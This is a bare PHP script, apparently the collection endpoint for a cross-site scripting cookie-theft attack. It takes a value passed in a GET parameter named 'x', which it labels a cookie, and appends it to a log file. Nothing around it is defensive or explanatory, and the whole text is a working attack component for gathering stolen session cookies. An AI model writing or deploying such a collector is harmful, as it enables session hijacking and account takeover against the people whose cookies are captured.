<?php

$cookie = $_GET["x"];
$file = fopen("log.txt", "a");
fwrite($file, $cookie."\n");
fclose($file);

?>
